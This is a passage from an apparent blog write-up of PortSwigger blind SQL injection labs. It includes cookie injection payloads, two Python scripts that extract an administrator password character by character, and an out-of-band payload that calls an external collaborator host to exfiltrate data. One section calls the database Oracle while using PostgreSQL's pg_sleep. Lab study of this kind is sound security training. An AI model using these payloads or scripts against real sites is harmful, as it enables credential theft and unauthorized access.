highlighter-rouge">users</code> exist: <code class="language-plaintext highlighter-rouge">TrackingId=xyz' OR (SELECT 1 FROM users WHERE ROWNUM = 1)=1 --'</code> - yes it does! We need <code class="language-plaintext highlighter-rouge">WHERE ROWNUM = 1</code> otherwise we get an error instead, becase more then 1 row will be returned.</ol><h2 id="problems-arise---missing-concatenation">Problems arise - missing concatenation<a href="#problems-arise---missing-concatenation" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Now again, we need to somehow to evaluate the database but here is where i’ve noticed the problem. It was hard to make CASE work because query as i’ve seen above it’s breaking the WebApplication so i had to resort to concatenation using <code class="language-plaintext highlighter-rouge">||</code> which is also the way Portswigger suggest solving the lab.</p><ul><li>This gives us an <code class="language-plaintext highlighter-rouge">200 OK</code>: <code class="language-plaintext highlighter-rouge">xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'</code><li>This returns an error <code class="language-plaintext highlighter-rouge">xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'</code></ul><ol><li>Checking if <code class="language-plaintext highlighter-rouge">administrator</code> exist<div class="language-sql highlighter-rouge"><div class="code-header"> <span label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">xyz</span><span class="s1">'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE </span><span class="se">''</span><span class="s1"> END FROM users WHERE username='</span><span class="n">administrator</span><span class="s1">')||'</span> 
</pre></table></code></div></div><p>Result: Yes it does as it returns an error</p></ol><h2 id="finding-password-with-burp-intruder---first-character">Finding password with Burp Intruder - first character<a href="#finding-password-with-burp-intruder---first-character" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Let’s throw our query into intruder now.</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">TrackingId</span><span class="o">=</span><span class="n">xyz</span><span class="s1">'||(SELECT CASE WHEN SUBSTR(password,1,1)='</span><span class="err">§</span><span class="n">e</span><span class="err">§</span><span class="s1">' THEN TO_CHAR(1/0) ELSE </span><span class="se">''</span><span class="s1"> END FROM users WHERE username='</span><span class="n">administrator</span><span class="s1">')||'</span>
</pre></table></code></div></div><p>Let’s go with Sniper first to get only first character. Use <code class="language-plaintext highlighter-rouge">Brute forcer</code> with default settings and setting Min and Max length to 1:</p><p><img data-src="/assets/images/b604ee3e052727d0f01627de43329c373fadfcda07950235e64ec62110927bbd.png" alt="picture 39" data-proofer-ignore></p><h2 id="finding-password-with-burp-intruder---whole-password">Finding password with Burp Intruder - whole password<a href="#finding-password-with-burp-intruder---whole-password" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Now let’s cycle through 20 character using <code class="language-plaintext highlighter-rouge">Cluster Bomb</code> with 2 payload sets:</p><ul><li>Numbers from 1 to 21 with Step 1 and Min integer digits set to 1 and Max integer digits set to 2, eveything else to 0<li>Brute Forcer with Min and Max length set to 1</ul><p>Disable encoding!</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">TrackingId</span><span class="o">=</span><span class="n">xyz</span><span class="s1">'||(SELECT CASE WHEN SUBSTR(password,§1§,1)='</span><span class="err">§</span><span class="n">e</span><span class="err">§</span><span class="s1">' THEN TO_CHAR(1/0) ELSE </span><span class="se">''</span><span class="s1"> END FROM users WHERE username='</span><span class="n">administrator</span><span class="s1">')||'</span><span class="p">;</span>
</pre></table></code></div></div><p>This is the closest that i was able to get: <img data-src="/assets/images/f3194e1e58bd1273ac34f45f947fced302c9421027260a51fd9558bd461ee256.png" alt="picture 40" data-proofer-ignore></p><p>I would have to re-arange the characters as i wasn’t able to start with cycling the 2nd payload set :(.</p><h2 id="automating-with-python">Automating with Python<a href="#automating-with-python" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>I’ve automated that password dump with python, again with comparing the characters against the ASCII table. I could’ve made the Ascii range smaller but i did not. Multithreading would also be nice ;) but maybe some other time.</p><div class="language-py highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="n">requests</span><span class="p">.</span><span class="n">urllib3</span><span class="p">.</span><span class="n">disable_warnings</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">inject_func</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">inj_str</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="mi">126</span><span class="p">):</span>
        <span class="c1"># now we update the sqli
</span>        <span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
        <span class="n">session</span><span class="p">.</span><span class="n">verify</span> <span class="o">=</span> <span class="bp">False</span>
        <span class="n">target</span> <span class="o">=</span> <span class="s">"%s"</span> <span class="o">%</span> <span class="p">(</span><span class="n">ip</span><span class="p">)</span>
        <span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="s">"TrackingId"</span><span class="p">:</span><span class="n">inj_str</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"[CHAR]"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">j</span><span class="p">)),</span><span class="s">"session"</span><span class="p">:</span><span class="s">"XtNTol6QXK5ZuBb7VkQDo9qoWGtXHxTP"</span><span class="p">}</span> 
        <span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span><span class="s">"http"</span><span class="p">:</span> <span class="s">"http://127.0.0.1:8080"</span><span class="p">}</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">target</span><span class="p">,</span><span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">,</span><span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span><span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
        <span class="n">status_code</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">status_code</span>
        <span class="k">if</span> <span class="n">status_code</span> <span class="o">==</span> <span class="mi">500</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">j</span>
    <span class="k">return</span> <span class="mi">0</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"(+) usage: %s &lt;target&gt; "</span> <span class="o">%</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="k">print</span><span class="p">(</span><span class="s">'(+) eg: %s 192.168.121.103'</span> <span class="o">%</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
    
    <span class="n">ip</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>

    <span class="n">out</span> <span class="o">=</span> <span class="s">"(+) Retrieving the password"</span>
    <span class="k">print</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">25</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">i</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
            <span class="n">injection_string</span> <span class="o">=</span> <span class="s">"xyz'||(SELECT CASE WHEN ASCII(SUBSTR(password,%d,1))=[CHAR] THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">)</span>
            <span class="n">extracted_char</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">inject_func</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">injection_string</span><span class="p">))</span>
            <span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">extracted_char</span><span class="p">)</span>
            <span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="n">flush</span><span class="p">()</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">break</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">(+) done!"</span><span class="p">)</span>
<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
</pre></table></code></div></div><p>Password has been retrieved from the script as well:</p><p><img data-src="/assets/images/cd78bc12615d509faf6f1277ff0f281635e585fce6fa1155e78fc79e18af0e51.png" alt="picture 42" data-proofer-ignore></p><p>Lab is done:</p><p><img data-src="/assets/images/4bd9bbcfe3f83bf94af0025e58d35caac7c247b31ce297e060bfdb5d07df6b36.png" alt="picture 41" data-proofer-ignore></p><h1 id="blind-sql-injection-with-time-delays">Blind SQL injection with Time delays</h1><blockquote><p>This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.</p><p>The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.</p><p>To solve the lab, exploit the SQL injection vulnerability to cause a 10 second delay.</p></blockquote><p>So for this lab, it’s only expected to create a delay so let’s get onto it.</p><h2 id="finding-blind-sqli-using-time-delay">Finding Blind SQLi using Time delay<a href="#finding-blind-sqli-using-time-delay" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>The techniques for triggering a time delay are specific to the type of database being used.</p><p>In this lab we have OracleDB. To make SQLi to work,concatenation (<code class="language-plaintext highlighter-rouge">||</code>) had to be used again as in previous lab. My assumption is that we’re injection into WHERE statement.</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">TrackingId</span><span class="o">=</span><span class="n">U0z9axszQ7GfsVAt</span><span class="s1">'||PG_SLEEP(10)--
</span></pre></table></code></div></div><p>We can observe delay in the response: <img data-src="/assets/images/b3c68593afa84175e929bd4db0dbd6507f860ee80eb29278226773d45451d179.png" alt="picture 44" data-proofer-ignore></p><p>Lab done: <img data-src="/assets/images/5328543c3d8e31bce22751cb9c12995947a46d5d177e6f5ad61e449c8f5688a2.png" alt="picture 43" data-proofer-ignore></p><h1 id="blind-sql-injection-with-time-delays-and-information-retrieval">Blind SQL injection with time delays and information retrieval</h1><h2 id="intro-3">Intro<a href="#intro-3" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><blockquote><p>This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.</p><p>The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.</p><p>The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.</p><p>To solve the lab, log in as the administrator user.</p></blockquote><p>So here the plan is first to find the SQL injection, and then to retrieve the administrators password as it has been done before.</p><h2 id="finding-the-sql-injection-1">Finding the SQL Injection<a href="#finding-the-sql-injection-1" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-sql highlighter-rouge"><div class="code-header"> <span label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">TrackingId</span><span class="o">=</span><span class="n">QRvD0dG8SNkAeEr7</span><span class="s1">'||(SELECT PG_SLEEP(3))||'</span>
</pre></table></code></div></div><p><img data-src="/assets/images/53f3a28bd6f7aa0137a79845903298e3add6706f369173ae149db507ba33e004.png" alt="picture 45" data-proofer-ignore></p><p>SQL Injection works with concatenation using <code class="language-plaintext highlighter-rouge">||</code> but it also works using stacked queries, separating it with <code class="language-plaintext highlighter-rouge">;</code>:</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">TrackingId</span><span class="o">=</span><span class="n">QRvD0dG8SNkAeEr7</span><span class="s1">'%3b(SELECT PG_SLEEP(3))%3b'</span>
</pre></table></code></div></div><h2 id="testing-yesno-condition">Testing Yes/No Condition<a href="#testing-yesno-condition" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Using <code class="language-plaintext highlighter-rouge">CASE WHEN ... THEN</code> statement we get response in 3 seconds<div class="language-sql highlighter-rouge"><div class="code-header"> <span label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">TrackingId</span><span class="o">=</span><span class="n">QRvD0dG8SNkAeEr7</span><span class="s1">'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(3)+ELSE+pg_sleep(0)+END--;
</span></pre></table></code></div></div><li>We should now get response immediatly:<div class="language-sql highlighter-rouge"><div class="code-header"> <span label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">TrackingId</span><span class="o">=</span><span class="n">QRvD0dG8SNkAeEr7</span><span class="s1">'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(3)+ELSE+pg_sleep(0)+END--; session=kP6ZffRl10Pc4DroO8dsIuSMBIwLfgJq
</span></pre></table></code></div></div><p>And yes, we do get a response in 98 miliseconds.</p></ol><h2 id="extracting-password-from-administrator">Extracting password from <code class="language-plaintext highlighter-rouge">administrator</code><a href="#extracting-password-from-administrator" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="does-administrator-exist">Does <code class="language-plaintext highlighter-rouge">administrator</code> exist<a href="#does-administrator-exist" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-sql highlighter-rouge"><div class="code-header"> <span label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">TrackingId</span><span class="o">=</span><span class="n">QRvD0dG8SNkAeEr7</span><span class="s1">'%3BSELECT+CASE+WHEN+(username='</span><span class="n">administrator</span><span class="s1">')+THEN+pg_sleep(3)+ELSE+pg_sleep(0)+END+FROM+users--
</span></pre></table></code></div></div><p>Answer: Yes it does!</p><h3 id="what-is-the-first-character-of-administrators-password">What is the first character of <code class="language-plaintext highlighter-rouge">administrator</code>’s password<a href="#what-is-the-first-character-of-administrators-password" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>I’ve used <code class="language-plaintext highlighter-rouge">Request Timer</code> here for intruder as intruder itself does not display the response time :(.</p><p><img data-src="/assets/images/64ee5a2eab4aeafc8baf8132cdc28f898a35d8594fddb0a45c2ef19c9f156676.png" alt="picture 46" data-proofer-ignore></p><p>So the first character is <code class="language-plaintext highlighter-rouge">1</code> and we could let Intruder find all the characters but let’s try to do the same with Python again. I will again check for ascii values.</p><p>Checking with repeater if asking for ASCII values actually works:</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">TrackingId</span><span class="o">=</span><span class="n">QRvD0dG8SNkAeEr7</span><span class="s1">'%3bSELECT+CASE+WHEN+(username='</span><span class="n">administrator</span><span class="s1">'+AND+ASCII(SUBSTRING(password,1,1))=49)+THEN+pg_sleep(3)+ELSE+pg_sleep(0)+END+FROM+users--; session=kP6ZffRl10Pc4DroO8dsIuSMBIwLfgJq
</span></pre></table></code></div></div><p>… and yes it does! Now let’s automate with Python</p><h3 id="automation-with-python">Automation with Python<a href="#automation-with-python" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>Only thing that is different compared to scripts before it’s that we’re using time for comparison before and after request was sent.</p><div class="language-py highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">time</span>

<span class="n">requests</span><span class="p">.</span><span class="n">urllib3</span><span class="p">.</span><span class="n">disable_warnings</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">inject_func</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">inj_str</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="mi">126</span><span class="p">):</span>
        <span class="c1"># now we update the sqli
</span>        <span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
        <span class="n">session</span><span class="p">.</span><span class="n">verify</span> <span class="o">=</span> <span class="bp">False</span>
        <span class="n">target</span> <span class="o">=</span> <span class="s">"%s"</span> <span class="o">%</span> <span class="p">(</span><span class="n">ip</span><span class="p">)</span>
        <span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="s">"TrackingId"</span><span class="p">:</span><span class="n">inj_str</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"[CHAR]"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">j</span><span class="p">)),</span><span class="s">"session"</span><span class="p">:</span><span class="s">"kP6ZffRl10Pc4DroO8dsIuSMBIwLfgJq"</span><span class="p">}</span> 
        <span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span><span class="s">"http"</span><span class="p">:</span> <span class="s">"http://127.0.0.1:8080"</span><span class="p">}</span>
        <span class="n">time_start</span><span class="o">=</span><span class="n">time</span><span class="p">.</span><span class="n">time</span><span class="p">()</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">target</span><span class="p">,</span><span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">,</span><span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span><span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
        <span class="n">time_finish</span><span class="o">=</span><span class="n">time</span><span class="p">.</span><span class="n">time</span><span class="p">()</span>
        <span class="n">time_total</span><span class="o">=</span><span class="n">time_finish</span> <span class="o">-</span> <span class="n">time_start</span>
        <span class="c1">#print(time_total)
</span>        <span class="k">if</span> <span class="n">time_total</span> <span class="o">&gt;</span> <span class="mi">2</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">j</span>
    <span class="k">return</span> <span class="mi">0</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"(+) usage: %s &lt;target&gt; "</span> <span class="o">%</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="k">print</span><span class="p">(</span><span class="s">'(+) eg: %s 192.168.121.103'</span> <span class="o">%</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
    
    <span class="n">ip</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>

    <span class="n">out</span> <span class="o">=</span> <span class="s">"(+) Retrieving the password"</span>
    <span class="k">print</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">25</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">i</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
            <span class="n">injection_string</span> <span class="o">=</span> <span class="s">"QRvD0dG8SNkAeEr7'%%3bSELECT+CASE+WHEN+(username='administrator'+AND+ASCII(SUBSTRING(password,%d,1))=[CHAR])+THEN+pg_sleep(3)+ELSE+pg_sleep(0)+END+FROM+users--"</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">)</span>
            <span class="n">extracted_char</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">inject_func</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">injection_string</span><span class="p">))</span>
            <span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">extracted_char</span><span class="p">)</span>
            <span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="n">flush</span><span class="p">()</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">break</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">(+) done!"</span><span class="p">)</span>
<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
</pre></table></code></div></div><p>Password has been retrived</p><p><img data-src="/assets/images/e1486d43d8687666b33712a1f1eedcac5d4ea40f40fd38397b57bbb478cbc182.png" alt="picture 48" data-proofer-ignore></p><p>Lab done:</p><p><img data-src="/assets/images/f7d2840be6c6cf0ba1594a12e8f8f85b4126f0f591f8cc84fad43a76f655059a.png" alt="picture 47" data-proofer-ignore></p><h1 id="blind-sql-injection-with-out-of-band-data-exfiltration">Blind SQL injection with out-of-band data exfiltration</h1><blockquote><p>This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie</p><p>The SQL query is executed asynchronously and has no effect on the application’s response. However, you can trigger out-of-band interactions with an external domain</p><p>The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.</p><p>To solve the lab, log in as the administrator user.</p></blockquote><p>First i should mention i had diffilculties finding the vulnerability by using SQLMap but had more luck with Burp’s Scanner</p><p><img data-src="/assets/images/1f542cb624697cd0ab99bf852e82b49c573b9e2665a407c3e4089964bbc5a443.png" alt="picture 0" data-proofer-ignore></p><p>This is query that Burp has used:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>Cookie: TrackingId=g3cOtQeauj4CSC6p'%7c%7c(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20rucxp%20SYSTEM%20%22http%3a%2f%2frpkzmgpymoyy6bk563eiduduslyem4a8y1lr9g.oasti'%7c%7c'fy.com%2f%22%3e%25rucxp%3b]%3e')%2c'%2fl')%20from%20dual)%7c%7c';
</pre></table></code></div></div><p>To solve the lab we need to exfiltrate <code class="language-plaintext highlighter-rouge">administrator</code>’s password. We can do it by exfiltrating data in the subdomain.</p><p><img data-src="/assets/images/6a6e7a845d2e34cd577a182fedebca7f281d15199b2321f82b7802656e91dc87.png" alt="picture 1" data-proofer-ignore></p><p>If the payload has worked, we should get an entry in the collaborator:</p><p><img data-src="/assets/images/2bf4bd6f7a183089677ea4ea78caa2f37afa121949c4d98bcbaa2f513ce938c2.png" alt="picture 3" data-proofer-ignore></p><p>Lab has been solved:</p><p><img data-src="/assets/images/1bd921f1b0f2a345da4d8f28c393430f4942920d3dada0b44d31fda6c0f45279.png" alt="picture 2" data-proofer-ignore></p><p>PS: PortSwiggers SQLi Cheatsheet: <a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">https://portswigger.net/web-security/sql-injection/cheat-sheet</a></p><h1 id="visible-error-based-sql-injection">Visible error-based SQL injection</h1><blockquote><p>This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned.</p><p>The database contains a different table called users, with columns called username and password. To solve the lab, find a way to leak the password for the administrator user, then log in to their account.</p></blockquote><p>In this lab, we get to see the error from the query, and if we read the description, it should be in the <code class="language-plaintext highlighter-rouge">trackingId</code> cookie.</p><p><img data-src="/assets/images/3f367f534be18cb057954eeab72d51251cc6df661345ca3cdd4908588c33a588.png" alt="picture 4" data-proofer-ignore></p><p>We can fix the query with <code class="language-plaintext highlighter-rouge">EEioT3zzbZMmwTuQ'+OR+1=1+--</code></p><p>Let us keep in mind we are dealing with error based injection and we should exfiltrate infromation through the errors.</p><p>As there is truncation in place, following query will work:</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="s1">' AND 2=CAST((SELECT username FROM users LIMIT+1) AS int)+--
</span></pre></table></code></div></div><p>We can retrieve the password from the same database, without using offset (luckily!).</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/web-application/'>Web Application</a>, <a href='/categories/sql-injection/'>SQL Injection</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/notes/" class="post-tag no-text-decoration" >Notes</a> <a href="/tags/web-application/" class="post-tag no-text-decoration" >Web Application</a> <a href="/tags/portswigger/" class="post-tag no-text-decoration" >Portswigger</a> <a href="/tags/sql-injection/" class="post-tag no-text-decoration" >SQL Injection</a> <a href="/tags/blind-sql-injection/" class="post-tag no-text-decoration" >Blind SQL Injection</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Blind SQL Injection - CyberSec-Research.Space&url=https://an9k0r.github.io/posts/Blind_SQL_Injection/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> 